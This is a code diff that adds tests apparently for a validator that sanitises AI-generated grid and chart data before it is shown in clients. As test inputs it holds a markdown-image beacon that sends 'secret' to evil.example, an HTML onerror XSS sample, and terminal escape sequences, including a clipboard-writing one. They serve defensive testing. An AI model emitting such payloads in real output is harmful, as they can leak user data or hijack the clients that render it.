@@ -216,6 +216,52 @@ describe("fallback vectors (through checkShowInput)", () => {
   });
 });
 
+describe("what the engine writes from block data is inert text in every client (review 1, finding 3)", () => {
+  const grid = (cell: string, key = "note") => ({ columns: [{ key: "id", label: "Id", type: "num" }, { key, label: "Note", type: "text" }], rows: [{ id: 1, [key]: cell }], row_key: "id" });
+  const tabled = (kind: string, spec: unknown) => checkShowInput(show({ kind, spec, fallback: { text: FALLBACK, table: { from: "rows" } } }));
+  const table = (r: ReturnType<typeof checkShowInput>) => (r.ok ? r.show.fallback.slice(FALLBACK.length) : `refused ${r.error.code} ${r.error.path}`);
+
+  test("a grid cell carrying a markdown image to a remote URL cannot become an image or a link", () => {
+    const t = table(tabled("grid", grid("![x](https://evil.example/p.png?d=secret)")));
+    expect(t).not.toContain("![");
+    expect(t).not.toContain("://");
+    expect(t).toContain("\\!\\[x\\](https:\\/\\/evil.example/p.png?d=secret)");
+  });
+
+  test("a chart datum carrying HTML cannot become markup", () => {
+    const spec = line([{ week: "<img src=x onerror=alert(1)>", onhand: 1 }]);
+    const t = table(tabled("chart", spec));
+    expect(t).not.toMatch(/(^|[^\\])</);
+    expect(t).toContain("\\<img src=x onerror=alert(1)\\>");
+  });
+
+  test("terminal escapes: refused in the model's fallback text and in any cell, a header included", () => {
+    for (const text of [`\u001b]52;c;ZXZpbA==\u0007${FALLBACK}`, `\u001b[2J${FALLBACK}`, `${FALLBACK}\u009b31m`]) {
+      const r = checkShowInput(show({ fallback: { text } }));
+      expect(r.ok ? null : [r.error.code, r.error.path]).toEqual(["VALIDATION_FAILED", "fallback.text"]);
+    }
+    expect(table(tabled("grid", grid("red \u001b[31mALERT\u001b[0m")))).toBe("refused VALIDATION_FAILED spec.rows[0].note");
+    expect(table(tabled("chart", line([{ week: "w\u001b[2J", onhand: 1 }])))).toBe("refused VALIDATION_FAILED spec.vl.data.values[0].week");
+    expect(table(tabled("chart", line([{ week: "w", onhand: 1, "k\u001b[2J": 1 }])))).toBe("refused VALIDATION_FAILED spec.vl.data.values[0]");
+  });
+
+  test("markdown-active characters are escaped; autolinks are broken; a long cell is cut at 120 characters", () => {
+    const t = table(tabled("grid", grid("*bold* _em_ `code` ~~s~~ #h & <b> www.example.com " + "x".repeat(300))));
+    for (const raw of ["*bold*", "_em_", "`code`", "~~s~~", " #h", " & ", "<b>", "www.example"]) expect(t).not.toContain(raw);
+    const cell = t.split("\n").at(-1)!.split(" | ")[1]!.replace(/ \|$/, "");
+    expect([...cell.replace(/\\(.)/g, "$1")].length).toBeLessThanOrEqual(120);
+    expect(cell.endsWith("…")).toBe(true);
+  });
+
+  test("a refusal's message quotes the model's names inertly", () => {
+    const r = checkShowInput(show({ kind: "grid", spec: { ...grid("x"), rows: [{ id: 1, "![x](https://e.example/p.png)": "y" }] } }));
+    expect(r.ok ? null : r.error.code).toBe("VALIDATION_FAILED");
+    const said = r.ok ? "" : `${r.error.message} ${r.error.hint ?? ""}`;
+    expect(said).not.toContain("![");
+    expect(said).not.toContain("://");
+  });
+});
+
 describe("checkShowInput", () => {
   const fault = (raw: unknown, opts?: Parameters<typeof checkShowInput>[1]) => {
     const r = checkShowInput(raw, opts);
